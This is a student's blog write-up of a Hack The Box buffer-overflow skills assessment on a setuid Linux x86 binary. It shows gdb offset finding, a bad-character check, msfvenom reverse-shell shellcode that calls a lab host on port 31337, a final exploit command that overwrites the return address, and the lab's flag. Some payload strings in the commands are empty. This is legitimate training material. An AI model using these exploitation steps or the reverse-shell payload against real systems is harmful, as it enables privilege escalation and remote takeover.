---
title: Stack-Based Buffer Overflows on Linux x86 - Skills Assessment
published: 2025-11-18
description: 'this is Stack-Based Buffer Overflows on Linux x86 - Skills Assessment'
image: 'guide/bobackground.jpg'
tags: [write_up,HTB,learning,assembly,binary_exploitation]
category: 'learning'
draft: false 
lang: 'en'
---


Hiii ! been long timeee!

Recently i have been busy with some small competitions in school. Yeh if you see this blog, i mean i lost the competition :V.

Anyway, i back to keep up with some basic assembly for binary exploitation and reverse engineering for upcoming CTF  yeahhh. And this write up is final skill assessment for  **Stack-Based Buffer Overflows on Linux x86.** This module is really nice, and kind of complicating for newbie like me. But follow along with each section It would help you to solve this one by yourself.  

If you read it WU and without solving the module i highly recommend you to give yourself some more time to do the lab carefully and make sure you read everything in the module ! Maybe 1 or 2 hours. And you can get back !

Ok so lets dive in the wu

## Part 1: Check if the file is **Executable and Linkable Format**

First, ssh to the box and get the 1st flag with `file`command

```php

file leave_msg 

leave_msg: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8694607c1cba3fb3814a144fb014da53d3f3e49e, not stripped

```

### Flag1:  `ELF 32-bit`

## part 2

### Take control of EIP

Define Segmentation fault

```sql
htb-student@nixbof32skills:~$ gdb leave_msg 

(gdb) run $(python -c "print '\x55' * 2100")
Starting program: /home/htb-student/leave_msg $(python -c "print '\x55' * 2100")
Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()

```

### **Determine The Offset**

Now i create a pattern for making a segmentation fault.

Create Pattern

```sql
┌──(kali㉿kali)-[~]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100 > patern.txt
                                                               
┌──(kali㉿kali)-[~]
└─$ cat patern.txt 


```

### **GDB - Using Generated Pattern**

```sql
(gdb) run $(python -c "print ''") 
```

```sql

Program received signal SIGSEGV, Segmentation fault.
0x37714336 in ?? ()

```

![buffer_overflow_3.png](guide/bo0.png)

### **GDB - Offset**

```sql
┌──(kali㉿kali)-[~]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37714336
[*] Exact match at offset 2060

(gdb) run $(python -c "print '\x55' * 2060 + '\x66' * 4")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/htb-student/leave_msg $(python -c "print '\x55' * 2060 + '\x66' * 4")

Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()

```

### Flag 2 : `2060`

```sql
Buffer = "\55x" * (2064 - 100 - 150 - 4) = 1810
NOPs = "\x90" * 100
shellcode = "\x44"
EIP = "\x66" * 4
```

![buffer_overflow_8.png](guide/bo1.png)

### GDB breakpoint

```sql
 (gdb) break leavemsg
```

```sql
Breakpoint 1, 0x56555691 in leavemsg ()
```

### Send CHARS to check bad characters

```sql
CHARS=""

```

```sql
(gdb) run $(python -c 'print "\x55" * (2064 - 256 - 4) + "" + "\x66" * 4')

```

```sql
(gdb) x/2000xb $esp+700
```

```sql
---Type <return> to continue, or q <return> to quit---
0xffffd690:     0x55    0x55    0x55    0x55    0x55    0x55    0x01    0x02
0xffffd698:     0x03    0x04    0x05    0x06    0x07    0x08    0x00    0x0b
0xffffd6a0:     0x0c    0x0d    0x0e    0x0f    0x10    0x11    0x12    0x13
0xffffd6a8:     0x14    0x15    0x16    0x17    0x18    0x19    0x1a    0x1b
0xffffd6b0:     0x1c    0x1d    0x1e    0x1f    0x00    0x21    0x22    0x23
0xffffd6b8:     0x24    0x25    0x26    0x27    0x28    0x29    0x2a    0x2b

```

> 4 bad characters `0x00,0x09,0x0a,0x20`
> 

Here you can also check for the Size of the stack after overwriting the EIP 

```sql
(gdb) info proc all
process 18174
warning: target file /proc/18174/cmdline contained unexpected null characters
cmdline = '/home/htb-student/leave_msg'
cwd = '/home/htb-student'
exe = '/home/htb-student/leave_msg'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
        0x56555000 0x56556000     0x1000        0x0 /home/htb-student/leave_msg
        0x56556000 0x56557000     0x1000        0x0 /home/htb-student/leave_msg
        0x56557000 0x56558000     0x1000     0x1000 /home/htb-student/leave_msg
        0xf7ded000 0xf7fbf000   0x1d2000        0x0 /lib32/libc-2.27.so
        0xf7fbf000 0xf7fc0000     0x1000   0x1d2000 /lib32/libc-2.27.so
        0xf7fc0000 0xf7fc2000     0x2000   0x1d2000 /lib32/libc-2.27.so
        0xf7fc2000 0xf7fc3000     0x1000   0x1d4000 /lib32/libc-2.27.so
        0xf7fc3000 0xf7fc6000     0x3000        0x0 
        0xf7fcf000 0xf7fd1000     0x2000        0x0 
        0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
        0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
        0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
        0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
        0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
        0xfffdc000 0xffffe000    0x22000        0x0 [stack]

```

### Flag3 = `0x22000`

## Part 3 : **Generating Shellcode**

```sql
└─$   msfvenom -p linux/x86/shell_reverse_tcp lhost=10.129.194.191 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" 

[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xda\xc2\xbb\xcc\xfd\x0e\xd4\xd9\x74\x24\xf4\x5a\x33\xc9"
"\xb1\x12\x31\x5a\x17\x83\xea\xfc\x03\x96\xee\xec\x21\x17"
"\xca\x06\x2a\x04\xaf\xbb\xc7\xa8\xa6\xdd\xa8\xca\x75\x9d"
"\x5a\x4b\x36\xa1\x91\xeb\x7f\xa7\xd0\x83\x75\xd6\xe1\xec"
"\xe2\xda\xe5\x68\x9a\x53\x04\x3c\x3a\x34\x96\x6f\x70\xb7"
"\x91\x6e\xbb\x38\xf3\x18\x2a\x16\x87\xb0\xda\x47\x48\x22"
"\x72\x11\x75\xf0\xd7\xa8\x9b\x44\xdc\x67\xdb";

```

**Exploit with Shellcode**

```sql
buffer = (2064 - 100  - 95 - 4) * "\x55"
NOPs= "\x90" * 100 
shellcode= ""

EIP = "\x66" * 4'
```

```sql
-- test

(gdb) run $(python -c 'print "\x55" * (2064 - 100 - 95 - 4) + "\x90" * 100 + "" + "\x66" * 4') 
```

```sql
(gdb) x/2000xb $esp+700
```

![image.png](guide/bo2.png)

### **Identification of the Return Address**

One thing  i want to mention here, when you `netcat`  make sure you run it on the Linux machine (provide from the lab) when you ssh into

```sql
ssh htb-student@10.129.194.191
```

```sql
./leave_msg $(python -c 'print "\x55" * 1841 + "\x90" * 124 + "" + "\xe8\xd6\xff\xff"')
```

```sql
cat /root/flag.txt
```

### Flag 4 :

`HTB{wmcaJe4dEFZ3pbgDEpToJxFwvTEP4t}`

My email if you need anything to discuss: `longduiga0123@gmail.com`